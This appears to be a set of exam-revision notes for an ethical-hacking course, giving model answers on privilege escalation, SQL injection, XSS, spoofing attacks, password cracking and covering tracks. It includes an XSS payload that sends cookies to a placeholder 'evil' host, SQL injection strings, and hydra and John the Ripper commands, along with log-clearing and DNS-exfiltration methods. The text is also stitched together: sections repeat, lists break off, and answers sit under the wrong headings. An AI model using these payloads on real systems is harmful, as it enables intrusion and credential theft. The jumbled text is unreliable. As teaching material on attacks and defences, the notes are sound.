  6. Examine without decrypting. Analyse the file header/signature, size, entropy (high entropy suggests encryption), timestamps and metadata to identify the algorithm and container, and carve copies of the encrypted file for later attack.

Example. A ZIP archive is password protected; a dictionary attack recovers a weak password, after which the extracted files can be read normally.

Worked detail — Horizontal privilege escalation

Horizontal privilege escalation (horizontal movement) is an attack in which a user accesses the data or functions of another user who has the same privilege level, without elevating their own rights. It contrasts with vertical escalation, where a low-privilege user becomes an administrator or root.

Mechanism: the attacker first compromises one account — by password guessing, phishing, session-token theft or Pass-the-Hash — and then uses that legitimate identity to reach peers' resources: another user's mailbox, home directory or application records. On networks, "lateral movement" uses the same idea with tools such as PsExec, WMI or stolen Kerberos tickets to hop from one workstation to the next.

Example: an employee in accounts reads a colleague's payslip in the same HR application by changing the user-ID parameter from id=1042 to id=1043 — an Insecure Direct Object Reference (IDOR). No admin rights are gained, yet confidentiality is broken. Another example is using a harvested NTLM hash to log into a peer's workstation.

Countermeasures: enforce authorisation checks on every object, use unique accounts, MFA, network segmentation and EDR monitoring of lateral-tool activity.

Exam tip: The decisive phrase is "same privilege level, different user". Always contrast it in one line with vertical escalation to prove you know the difference.

Worked detail — Vertical privilege escalation

Definition. Vertical privilege escalation (vertical escalation) is an attack in which a user with low privileges gains the higher privileges of an administrator, root or SYSTEM on the same system. It contrasts with horizontal escalation, where the attacker assumes the rights of another ordinary user at the same level.

Mechanism and common techniques.

  • Vulnerable setuid/setgid binaries or kernel flaws: a program running with elevated rights is tricked into executing attacker code, granting a root shell.
  • Stolen or cracked credentials: keyloggers, memory dumping (e.g. Mimikatz) or password reuse reveal an administrator's password or hash, which is then used to log in as admin.
  • Misconfigured services and permissions: writable service binaries, unquoted service paths, weak registry ACLs or scheduled tasks let a normal user replace an executable that later runs as SYSTEM.
  • Token impersonation / DLL hijacking / injection: the attacker inherits a privileged token or forces a privileged process to load a malicious DLL.

Typical steps. Enumerate current privileges and OS version → find a vulnerable component → run the exploit → obtain a higher-privilege shell → disable auditing and maintain access.

Example. A standard user exploits an unpatched local kernel vulnerability to add themselves to the Administrators group, then reads password hashes they were previously denied access to.

Countermeasures: least privilege, prompt patching, UAC, strong admin credentials, application control and privilege-monitoring/EDR.

Exam tip. The defining wording is "lower privilege → higher privilege on the same system". Write the contrast with horizontal escalation in one sentence; examiners use it to separate full from partial answers.

Definition. An exploit database is a searchable repository that catalogues known software vulnerabilities together with proof-of-concept code, affected versions and references. Worked detail — SQL Injection

SQL injection (SQLi) is a web application vulnerability in which untrusted user input is concatenated into a SQL query and interpreted as code rather than as data. It arises when applications fail to validate or properly parameterise input.

Mechanism: The attacker submits input containing SQL syntax (for example a quote followed by an always-true condition such as ' OR '1'='1) into a form field or URL parameter. Because the input is built directly into the query string, the database executes the altered statement. By varying the input, the attacker can bypass authentication, read tables they should not see (UNION-based), infer data through true/false responses (blind SQLi), or, with sufficient privileges, modify or delete records.

Effect on web applications: Unauthorised access to user accounts, disclosure of entire databases (credentials, card data), data corruption or deletion, and in some configurations escalation to operating-system command execution and full server compromise. It also causes legal and reputational damage.

Countermeasures: Parameterised queries / prepared statements (the primary defence), stored procedures, input validation and allow-listing, least-privilege database accounts, ORM usage, disabling verbose error messages, and a WAF as defence in depth.

Pitfall: Escaping special characters alone is not a reliable fix. The single strongest answer is "use parameterised queries so data is never treated as code".
Exam tip: State the root cause (untrusted input concatenated into a query), one attack idea (authentication bypass or data theft), and the main fix (prepared statements). Keep any example conceptual — do not need to write a working payload.

Worked detail — SQL injection

Definition. SQL injection (SQLi) is a vulnerability in which untrusted user input is concatenated into an SQL query, so the input is executed as code. It can bypass authentication, dump databases or destroy data.

Mechanism. A vulnerable backend builds SELECT * FROM users WHERE name='"+user+"'. Supplying ' OR '1'='1 closes the string and makes the WHERE clause always true, logging the attacker in without a password.

Detection (finding it).

  1. Test every input (forms, URL parameters, cookies, headers) with ', ", ;-- and observe SQL errors.
  2. Use boolean pairs: ' OR 1=1-- vs ' AND 1=0-- — a different response indicates injection.
  3. Use time-based payloads e.g. SLEEP(5) / WAITFOR DELAY '0:0:5' and measure the delay.
  4. Confirm with UNION enumeration, ORDER BY to find column count, and tools such as sqlmap.

Prevention: parameterised queries / prepared statements, stored procedures, input validation, least-privileged DB accounts, WAF.

Exam tip: Show one payload AND name the fix (prepared statements) — examiners look for both detection and remediation.

Worked detail — Remote Exploitation & MITM with Session Hijacking

Part (a) — How remote exploitation works (6 marks)

Remote exploitation is the act of compromising a machine or application over a network without prior physical or local access, by triggering a vulnerability in a service that listens on a port. It is the core of most network attacks because it turns information gathered during scanning into actual control.

Mechanism / steps:

  1. Discover a reachable host and enumerate open ports/services and versions (e.g., an unpatched web server or SMB service).
  2. Identify a vulnerability in that service — a known CVE, missing patch, weak configuration or logic flaw.
  3. Select or craft an exploit that reliably triggers the flaw (a payload delivered over the network to the listening port).
  4. Deliver the payload to obtain a shell or code execution on the target — this is Remote Code Execution (RCE).
  5. Post-exploitation: escalate privileges, dump credentials, pivot to other hosts and establish persistence.

Example: An unpatched, internet-facing service with a known buffer-overflow CVE is exploited, giving the attacker a remote shell as a low-privileged user. Countermeasures: prompt patching, hardening/disabling unused services, least privilege, network segmentation, IDS/IPS, WAF and exposure reduction (firewalls). Remote exploitation differs from local exploitation in that the attacker needs no account on the machine first.

Part (b) — Steps in an MITM attack including session hijacking (8 marks)

A Man-in-the-Middle attack places the attacker in the traffic path. When the goal is account takeover, it commonly leads to session hijacking — stealing the victim's session token and replaying it.

Worked detail — Brute Force & ARP Spoofing to DoS

Part (a) — Brute-force attacks (6 marks)

A brute-force attack tries every possible (or a large set of) credential combinations until the correct one works. It is exhaustive trial-and-error, automated by tools that test thousands of guesses per second, often accelerated by GPUs and distributed botnets.

Variants: pure brute force (all character combinations), dictionary attack (common words + rules), hybrid (words with appended digits/symbols), credential stuffing (reusing leaked username/password pairs), and password spraying (a few common passwords across many accounts to avoid lockouts). Against hashes offline, the attacker compares computed hashes to a stolen hash file; online, guesses are submitted to a login form.

How it compromises security: Once a password is guessed, the attacker gains unauthorised access, escalates privileges, exfiltrates data or pivots deeper. Weak, short or reused passwords fall quickly — the effective search space is small — and the attack is noisy but often detectable in logs as many failed logins.

Countermeasures: account lockout and exponential backoff/rate limiting, CAPTCHA, strong password policy and passphrases, salted slow hashing (bcrypt/Argon2) for stored passwords, MFA (which defeats a guessed password alone), monitoring/alerting on failed-login bursts, and breached-password checks.

Part (b) — ARP spoofing leading to DoS, and countermeasures (8 marks)

ARP spoofing poisons a host's IP-to-MAC cache with forged replies. Beyond enabling eavesdropping/MITM, it can directly cause a Denial of Service by making traffic disappear or be corrupted.

Worked detail — Q20(a) — Password cracking for system hacking

Definition. Password cracking recovers or guesses a user's password to gain unauthorised access to a system. In system hacking it is used after enumeration to obtain the credentials needed for login, privilege escalation and persistence.

Worked detail — Q17(b) — Reverse engineering

Definition. Reverse engineering is the process of analysing a compiled program, binary or malware to discover its structure, logic and behaviour without the original source code. In ethical hacking it is used to understand malicious code and find vulnerabilities.

Worked detail — Types of exploits with examples

An exploit is a piece of code, input or technique that takes advantage of a vulnerability to cause an unauthorised, unintended or harmful result. Exploits are commonly classified as follows.

Worked detail — Buffer Overflow & Writing an Exploit

Part (a) — Buffer overflow and its web-security implications (6 marks)

A buffer overflow occurs when a program writes more data into a fixed-size memory buffer than it can hold, so the excess overwrites adjacent memory. It is caused by missing bounds checks in languages such as C/C++ (unsafe functions like strcpy, gets). In a stack overflow, the overflow can overwrite the saved return address (EIP/RIP), letting an attacker redirect execution to injected code; a heap overflow corrupts heap metadata or function pointers.

Stack grows down:
  [ local buffer 256 bytes ]  <-- user input (too long)
  [ saved EBP               ]
  [ return address (EIP)    ]  <-- overwritten -> jump to attacker's code
  [ function arguments      ]

Implications in web security: Many web servers, CGI binaries, native modules and embedded devices are written in C/C++; an overflow in an internet-facing component can give remote code execution, crashes/DoS, privilege escalation or data leakage. Classic web-related cases include overflows in server extensions, image/parser libraries and protocol handlers. Even where web apps use managed languages, the underlying stack (web server, interpreter) can be vulnerable.

Countermeasures: safe libraries and bounds-checked functions, input-length validation, ASLR (randomises addresses), DEP/NX (marks stack non-executable), stack canaries, compiler fortification, memory-safe languages (Rust, Go, Java), fuzzing and patching.

Worked detail — Brute-force attack

Definition. A brute-force attack tries every possible credential combination until the correct one is found. It is exhaustive and unintelligent in principle, but dictionary and rule-based variants make it practical by trying likely passwords first.

Mechanism / steps.

  1. Identify the target service — SSH, RDP, FTP, HTTP login form, or a password hash file.
  2. Build a wordlist (rockyou.txt, common passwords) and add mutation rules (leetspeak, appended digits).
  3. Automate attempts with a tool: hydra -l admin -P pass.txt target ssh, John the Ripper or Hashcat for offline hashes.
  4. Observe responses — successful login, changed hash, or "account locked" message — and record the match.

Example. Hydra tests FTP logins at 50 threads; John cracks a stolen SHA-1 hash offline at millions of guesses per second.

Search space ≈ N^L for alphabet size N and length L — why long, complex passwords resist brute force.

Pitfall: Forgetting account lockout, CAPTCHA and rate limiting; a good answer always states both the attack steps and the defences (strong passwords, salts, lockout, MFA).

Network sniffing

3 marks

Explain network sniffing.

Answer

Definition. Network sniffing (packet capture) is the process of capturing and inspecting every packet traversing a network segment, using a packet analyser in promiscuous mode. Legitimate use: troubleshooting and intrusion analysis; malicious use: stealing credentials sent in clear text.

Mechanism. A NIC normally accepts only frames addressed to it. In promiscuous mode it accepts all frames on the collision domain. Answer

Definition. SQL injection (SQLi) is a vulnerability in which untrusted user input is concatenated into an SQL query, so the input is executed as code. It can bypass authentication, dump databases or destroy data.

Mechanism. A vulnerable backend builds SELECT * FROM users WHERE name='"+user+"'. Supplying ' OR '1'='1 closes the string and makes the WHERE clause always true, logging the attacker in without a password.

Cross-site scripting

3 marks

What is cross-site scripting and what are its different variations?

Answer

Definition. Cross-site scripting (XSS) injects malicious JavaScript into a web page that is then executed in another user's browser, allowing cookie theft, session hijacking, keylogging or defacement.

Variations.

  • Reflected (non-persistent): the payload is in the request (e.g. a search query) and is echoed immediately in the response. Needs the victim to click a crafted link.
  • Stored (persistent): the payload is saved on the server (comment, forum post, profile) and executes for every visitor — the most dangerous form.
  • DOM-based: the flaw is in client-side JavaScript that writes URL data into the DOM (document.write, innerHTML); the payload never reaches the server.

Example. A comment containing <script>document.location='http://evil/?c='+document.cookie</script> stored in a guestbook steals every reader's session cookie.

Prevention: context-aware output encoding, input validation, Content Security Policy, HttpOnly cookies, framework auto-escaping.

Exam tip: Name all three types with one example each; state that XSS is a client-side injection while SQLi targets the database.

Q9

Password cracking challenges

3 marks

List out the challenges in password cracking.

Answer

Definition. Password cracking is recovering a password from a stored hash or a login service, usually with dictionaries, rules and brute force. The "challenges" are the factors that slow or prevent it.

Key challenges.

  1. Salting: a unique random salt per password makes precomputed rainbow tables useless and prevents identical hashes revealing identical passwords.
  2. Slow, memory-hard hashes: bcrypt, scrypt, Argon2 and PBKDF2 deliberately cost time/memory, cutting guess rates dramatically.
  3. Password length and complexity: entropy grows exponentially — N^L — so long passphrases are infeasible to brute force.
  4. Account lockout / rate limiting / CAPTCHA: throttle online guessing and can lock the account.
  5. Multi-factor authentication: even a correct password is insufficient without the second factor.
  6. Unknown hash format / encryption and legal constraints: identifying the algorithm and having authorised access matter.

Example. An unsalted MD5 hash falls in seconds with a rainbow table; a bcrypt hash with cost 12 may take days per password.

Exam tip: Lead with salting and slow hashes; then mention lockout, length and MFA. Link each challenge to the countermeasure it provides.

Event logging

Define Event logging.

Answer

Definition. Event logging is the automatic recording of significant system and application events — logins, file access, process starts, configuration changes, errors — into a chronological, tamper-evident record (the event log / audit trail).

Q12(b) — Vulnerability assessment

14 marks

Describe how vulnerability assessment is done. (6 marks)

Answer

Definition. Vulnerability assessment (VA) is the systematic, automated discovery, classification and prioritisation of security weaknesses in systems and applications — it identifies flaws but does not necessarily exploit them.

Procedure.

  1. Define scope and asset inventory: list hosts, networks and applications to be assessed.
  2. Discovery: use ping sweeps and port scanners (Nmap) to find live systems, open ports and running services.

Example. Nessus reports an outdated Apache version (CVE with CVSS 9.8) on one host; the team patches it and a rescan shows the finding closed.

Risk = Threat × Vulnerability × Impact — why a critical CVE on an internal test box may rank lower than a medium one on the payment server.

Worked detail — Preventive measures for dumpster diving

Dumpster diving is a physical social-engineering attack in which an attacker retrieves sensitive information from discarded trash — paper documents, CDs, USB drives or old hardware. Prevention combines physical, procedural and technical controls.

  • Shred everything sensitive: use cross-cut (Level P-4 or higher) shredders for documents; shred or wipe CDs, DVDs and hard disks before disposal.
  • Secure disposal points: keep locked, access-controlled bins in a restricted, CCTV-monitored area; use a bonded, certified e-waste disposal vendor and demand a destruction certificate.
  • Policy and training: enforce a clean-desk/clean-bin policy, teach staff that even a name, badge or phone number is useful to an attacker, and forbid discarding media in public bins.
  • Physical and legal controls: fencing, lighting, guards and trespass signage; place bins off-site under supervision.

Example: a bank that cross-cut shreds statements, locks bins inside a guard-controlled loading bay and audits its disposal vendor defeats a diver who would otherwise reconstruct account numbers from torn printouts.

Q14(b) — Working of network sniffers

14 marks

Illustrate the working of network sniffers. (8 marks)

Answer

Definition. A network sniffer (protocol analyser) captures and decodes packets passing through a network segment. Examples: Wireshark, tcpdump, Ettercap, Cain and Abel.

Working — step by step.

  1. NIC in promiscuous mode: the interface is told to accept all frames, not just those addressed to its MAC.

  4. Decoding: the analyser parses each layer — Ethernet → IP → TCP/UDP → application — and reassembles streams.
  5. Analysis / display: protocol hierarchy, follow-stream, statistics and string search reveal credentials and data.

Q15(a) — DNS manipulation via ARP spoofing

14 marks

How DNS records can be manipulated using ARP spoofing? (6 marks)

Answer

Definition. ARP spoofing (ARP poisoning) sends forged ARP reply messages that associate the attacker's MAC address with another host's IP — typically the gateway. Once traffic is diverted through the attacker, DNS answers can be forged (DNS spoofing/poisoning) to redirect victims to malicious sites.

Step-by-step mechanism.

  1. The attacker learns the gateway IP (e.g. 192.168.1.1) and victim IP.
  2. Using a tool (Ettercap, arpspoof, Cain), the attacker sends gratuitous ARP replies: "192.168.1.1 is at attacker's MAC" and "victim is at attacker's MAC".
  3. Victim's ARP cache is poisoned; its traffic now goes to the attacker, who forwards it to the real gateway to avoid suspicion (MITM).
  4. The attacker runs a fake DNS responder and sniffs DNS queries. When the victim asks for www.bank.com, the attacker returns a forged A record pointing to a fake IP before the real DNS reply arrives.
  5. The victim's DNS cache stores the fake mapping and connects to the attacker's server, which can harvest credentials.
 victim --(forged ARP: GW=attackMAC)--> attacker --> real gateway
 victim DNS query "bank.com" --> attacker --> forged "A bank.com = 10.0.0.66"
 victim browser --> fake bank.com (phishing page)

Countermeasures: Dynamic ARP Inspection (DAI), DHCP snooping, static ARP entries, DNSSEC, encrypted DNS (DoH/DoT), HTTPS and IDSC alerting on ARP changes.

(a) Weak authentication leading to successful network attacks (6 marks)

Definition. Weak authentication exists when the mechanism used to verify a user's or device's identity is easy to bypass — default/blank passwords, short or guessable secrets, no MFA, credential reuse, shared accounts, or protocols that send credentials in clear text (Telnet, FTP, HTTP Basic).

  2. Credential stuffing — passwords leaked from one site are replayed on others because users reuse them.
  3. Sniffing cleartext credentials — protocols without encryption expose passwords to a network sniffer (see Q15).
  4. Session hijacking — weak session IDs or predictable cookies let an attacker impersonate a logged-in user.
  5. Lateral movement / privilege escalation — one compromised account opens the door to more systems, especially where accounts are shared or over-privileged.

Example: an default admin/admin on a router or an SQL-injection login bypass gives the attacker an immediate authenticated foothold; from there they pivot across the network.

Countermeasures. Strong password policy and length, unique accounts, MFA, account lockout/rate limiting, hashing with salt (bcrypt/Argon2), encrypted protocols (SSH, HTTPS, TLS), session expiry, least privilege and log monitoring.

Significance. Weak authentication is one of the most common root causes of breaches (OWASP A07 / broken authentication) because it converts a remote attacker into a "legitimate" user, defeating many perimeter controls at a stroke.

Worked detail — Module III — Q15 (OR Q16)

(a) DNS spoofing and its consequences (6 marks)

Definition. DNS spoofing (DNS poisoning/cache poisoning) is an attack in which false DNS mapping data is introduced into a resolver's cache so that a legitimate hostname resolves to an attacker-controlled IP address. Victims who type the correct URL are silently redirected to a malicious site.

Mechanism. The attacker sends forged DNS responses — often exploiting predictable transaction IDs, the birthday-attack window, or a compromised authoritative server — that arrive before the legitimate reply. The resolver accepts and caches the fake A-record.

  Victim                DNS Resolver              Attacker
    |--- www.bank.com ---->|                          |
    |                      |<-- FORGED reply ----------|  (forged TxID)
    |                      |   www.bank.com = 10.0.0.66 (evil)
    |<-- 10.0.0.66 --------|   [cached poisoned entry]

Consequences.

  • Credential theft — users enter passwords on a convincing fake site (pharming).
  • Man-in-the-middle / traffic interception — all traffic to the real domain flows through the attacker.
  • Malware distribution — the fake site serves drive-by downloads.
  • Denial of service / reputation damage — legitimate services become unreachable or are defamed.

Countermeasures. DNSSEC (signed, validated records), randomising source ports and transaction IDs, patching DNS servers, limiting cache TTLs, using trusted resolvers, and encryption (DoH/DoT). Note that DNS cache poisoning is distinct from on-the-wire ARP poisoning (Q16).

Definition. Sniffing (packet capture) is the interception of packets travelling across a network. Whether it succeeds depends on the network topology: hubs broadcast to all ports, switches send frames only to the destination port, and wireless networks broadcast to all radios in range.

Q16(a) — DHCP spoofing

14 marks

Describe DHCP Spoofing. (6 marks)

Answer

Definition. DHCP spoofing is an attack in which a rogue DHCP server responds to clients before the legitimate one, handing out malicious network configuration — above all, the attacker's machine as the default gateway and DNS server.

Mechanism / steps.

  1. A client broadcasts DHCPDISCOVER to obtain an IP address.
  2. The attacker's rogue DHCP server races the real server and replies with DHCPOFFER containing a valid-looking IP, subnet and DNS — but a malicious gateway (the attacker's IP).
  3. The client accepts the offer (usually the first reply wins) and configures its routing table through the attacker.
  4. All traffic leaving the victim now passes through the attacker, enabling sniffing, MITM, DNS spoofing and credential theft.
  5. The attacker forwards packets to the real gateway so the victim sees no interruption.
 client --DHCPDISCOVER--> * (broadcast)
        <--DHCPOFFER(gateway=attacker)-- rogue DHCP  [wins race]
        <--DHCPOFFER(gateway=real)----- real DHCP
 client traffic --> attacker --> real gateway  (MITM)

Example. Tools such as Yersinia or DHCPig set up a rogue server; a victim then resolves www.mail.com through the attacker's DNS to a phishing clone.

Countermeasures: DHCP snooping on switches (trust only legitimate server ports), DAI, 802.1X, port security, and monitoring for unexpected DHCPOFFERs.

Worked detail — Q15(a) — DNS manipulation via ARP spoofing

Definition. ARP spoofing (ARP poisoning) sends forged ARP reply messages that associate the attacker's MAC address with another host's IP — typically the gateway. Once traffic is diverted through the attacker, DNS answers can be forged (DNS spoofing/poisoning) to redirect victims to malicious sites.

Step-by-step mechanism.

  1. The attacker learns the gateway IP (e.g. 192.168.1.1) and victim IP.
  2. Using a tool (Ettercap, arpspoof, Cain), the attacker sends gratuitous ARP replies: "192.168.1.1 is at attacker's MAC" and "victim is at attacker's MAC".
  3. Victim's ARP cache is poisoned; its traffic now goes to the attacker, who forwards it to the real gateway to avoid suspicion (MITM).
  4. The attacker runs a fake DNS responder and sniffs DNS queries. When the victim asks for www.bank.com, the attacker returns a forged A record pointing to a fake IP before the real DNS reply arrives.
  5. The victim's DNS cache stores the fake mapping and connects to the attacker's server, which can harvest credentials.
 victim --(forged ARP: GW=attackMAC)--> attacker --> real gateway
 victim DNS query "bank.com" --> attacker --> forged "A bank.com = 10.0.0.66"
 victim browser --> fake bank.com (phishing page)

Countermeasures: Dynamic ARP Inspection (DAI), DHCP snooping, static ARP entries, DNSSEC, encrypted DNS (DoH/DoT), HTTPS and IDSC alerting on ARP changes.

Q16(b) — Attacking SQL servers

14 marks

How SQL Servers are vulnerable attacked? (8 marks)

Answer

Definition. SQL servers are attacked when applications pass untrusted input into queries, or when the database itself is exposed with weak credentials or default settings. The result is unauthorised data access, modification or destruction.

Attack vectors and procedure.

  1. Discovery: scan for port 1433 (MSSQL) / 3306 (MySQL) and fingerprint the version with Nmap or a banner grab.

Worked detail — Remote Exploitation & MITM with Session Hijacking

Part (a) — How remote exploitation works (6 marks)

Remote exploitation is the act of compromising a machine or application over a network without prior physical or local access, by triggering a vulnerability in a service that listens on a port. It is the core of most network attacks because it turns information gathered during scanning into actual control.

Mechanism / steps:

  1. Discover a reachable host and enumerate open ports/services and versions (e.g., an unpatched web server or SMB service).
  2. Identify a vulnerability in that service — a known CVE, missing patch, weak configuration or logic flaw.
  3. Select or craft an exploit that reliably triggers the flaw (a payload delivered over the network to the listening port).
  4. Deliver the payload to obtain a shell or code execution on the target — this is Remote Code Execution (RCE).
  5. Post-exploitation: escalate privileges, dump credentials, pivot to other hosts and establish persistence.

Example: An unpatched, internet-facing service with a known buffer-overflow CVE is exploited, giving the attacker a remote shell as a low-privileged user. Countermeasures: prompt patching, hardening/disabling unused services, least privilege, network segmentation, IDS/IPS, WAF and exposure reduction (firewalls). Remote exploitation differs from local exploitation in that the attacker needs no account on the machine first.

Part (b) — Steps in an MITM attack including session hijacking (8 marks)

A Man-in-the-Middle attack places the attacker in the traffic path. When the goal is account takeover, it commonly leads to session hijacking — stealing the victim's session token and replaying it.

Q17(b) — Reverse engineering

14 marks

Explain how Reverse Engineering is done. (6 marks)

Answer

Definition. Reverse engineering is the process of analysing a compiled program, binary or malware to discover its structure, logic and behaviour without the original source code. In ethical hacking it is used to understand malicious code and find vulnerabilities.

Procedure.

  1. Static analysis (without running): inspect file type and headers with file and PE/ELF tools; extract strings with strings; view imports, sections and packers with PE Explorer or objdump.
  2. Disassembly: convert machine code to assembly with IDA Pro, Ghidra, radare2 or objdump; identify functions, loops, API calls and constants.
  3. Decompilation: produce pseudo-code (Ghidra, Hex-Rays, dnSpy for .NET, CFR for Java) to recover high-level logic.
  4. Dynamic analysis (in a sandbox): run in an isolated VM and observe with a debugger (OllyDbg, x64dbg, gdb), process monitor (ProcMon) and a network sniffer; record file, registry and network activity.
  5. Interpret & document: reconstruct the algorithm or behaviour, identify indicators of compromise and write the analysis report.

Example. A packed Trojan is unpacked in a sandbox, strings reveal a C2 domain, and disassembly shows a keylogger hook — yielding IOCs for the IDS.

Pitfall: Never run unknown malware on a production machine; always use an isolated, disposable VM with no shared folders.

Worked detail — Routers, Firewalls & Reverse Engineering

Part (a) — Role of routers and firewalls (6 marks)

Routers operate at OSI Layer 3, forwarding packets between networks using IP addresses and routing tables. Their security role comes from Access Control Lists (ACLs) that permit or deny traffic by source/destination IP, protocol and port, plus NAT (hiding internal addressing), traffic segmentation through VLANs/subnets, rate limiting and logging. They shape what can reach a network at all.

Firewalls enforce a security policy at the network boundary — allowing trusted traffic and blocking untrusted traffic. Types: packet-filtering (stateless, ACL-based), stateful inspection (tracks connection state), proxy/application-level and Web Application Firewalls (inspect HTTP), and next-generation firewalls (deep packet inspection, IPS, app awareness). Firewalls implement default-deny, DMZ placement and egress filtering.

Internet
    |
 [Router]  - ACLs, NAT, rate-limiting
    |
 [Firewall]- stateful rules, DMZ, IDS/IPS
    |
  +-+-----------------+---------------+
  | DMZ: web/mail/DNS | Internal LAN  |
  +-------------------+---------------+

Combined protection: the router filters at the network edge and routes only allowed traffic; the firewall inspects and enforces policy statefully, isolating the DMZ from internal resources. Together they reduce the attack surface, contain lateral movement and generate logs for detection. Limitations: they cannot stop insiders, encrypted malicious traffic or application flaws behind allowed ports — hence defence in depth with IDS and hardening.

Part (b) — Reverse engineering and its role in finding vulnerabilities (8 marks)

Reverse engineering is the systematic analysis of a compiled program, binary or malware to understand its structure, behaviour and logic without the original source code. It deconstructs the artefact to reveal what it actually does.

Answer

Definition. Incident handling and response (IH&R) is the organised process of detecting, assessing, containing, eradicating and recovering from a security incident, followed by lessons learned. Its goal is to limit damage and restore normal operations.

The six-step process (numbered procedure).

Prepare → Detect/Analyse → Contain → Eradicate → Recover → Lessons Learned
          (log / SIEM evidence flows through every stage)

Q19(a) — Hiding evidence by altering event logs

14 marks

How can we hide evidence by altering event logs? (6 marks)

Answer

Definition. Attackers "cover their tracks" by modifying or destroying the event logs that would otherwise record their actions — a Module 5 technique that defeats detection and non-repudiation.

Common methods.

Example. After a privilege escalation the attacker clears Event ID 4672 (special privileges assigned) and rewrites the log file's modification time to blend in.

How it is used in system hacking (procedure).

  1. Enumerate accounts: obtain usernames via net user, LDAP queries, or enumeration tools.
  2. Obtain hashes / target a login: dump the SAM/NTDS database or /etc/shadow with Mimikatz or pwdump for offline cracking, or attack a live login service (SMB, RDP, SSH) online.
  3. Choose an attack: dictionary, rule-based, brute force, rainbow table (for unsalted hashes), or credential stuffing with leaked lists.
  4. Crack: run the cracker with wordlists and rules until plaintext passwords appear.
  5. Use the credentials: log in, escalate privileges (runas, sudo), and create a persistent backdoor account.

Tool — John the Ripper. An offline password cracker that auto-detects hash types (DES, MD5, NTLM, bcrypt). It accepts a hash file and a wordlist: john --wordlist=passwords.txt hashes.txt; rules mutate each word (capitalisation, appended digits, leetspeak), and john --show displays recovered passwords. Hashcat is a GPU-based alternative.

 dump hashes --> john --wordlist=rockyou.txt hashes.txt --> plaintext

Example / defences: A weak NTLM hash cracks in minutes; strong, salted, long passwords plus MFA, lockout and authorised, ethical use only defeat it.

Pitfall: Cracking is only lawful with written authorisation — stress the ethical/legal boundary in the answer.

Part (b) — Importance of password cracking and mitigation (8 marks)

Password cracking is central to system hacking because access credentials are the gateway to the whole system. Its importance:

  1. Initial access — recover passwords from captured hashes to log in as a legitimate user.
  2. Privilege escalation — crack administrator or service-account hashes to gain higher rights.
  3. Pivoting / lateral movement — reused local admin passwords open other machines on the network.

Q20(b) — Hiding evidence on the network

14 marks

Evidence on network can be hidden. Justify? (6 marks)

Answer

Definition. "Hiding evidence on the network" means an attacker concealing the traces of their activity from network-based detection — logs, flows and packets — so investigators cannot reconstruct the intrusion. The statement is justified because network evidence is fragile and can be manipulated in many ways.

How network evidence is hidden (justification).

  1. Encryption / tunnelling: VPNs, SSH tunnels and Tor hide payloads and destinations from sniffers, so packet inspection sees only ciphertext.
  2. Traffic fragmentation & timing: fragmenting packets or slow, low-and-slow rates defeat signature matching and rate-based detection.
  3. Spoofing: forged source IPs/MACs and proxy chains hide the true origin from flow records.
  4. Protocol abuse / covert channels: data hidden in DNS queries, ICMP echoes or HTTP headers evades ordinary monitoring.
  5. Log & flow manipulation: clearing device logs, disabling NetFlow, or flooding the SIEM with noise buries the real events.
  6. Fileless & in-memory techniques: no disk artifacts and legitimate admin tools (PowerShell, WMI) leave minimal traces.

Example. An attacker exfiltrates data through DNS TXT queries to a rogue authoritative server; the firewall sees only normal DNS — no file transfer is recorded.

Countermeasures: full-packet capture, NetFlow analysis, TLS inspection where lawful, DNS monitoring, NDR/IDS, strict egress filtering and correlated logging so hiding becomes detectable.
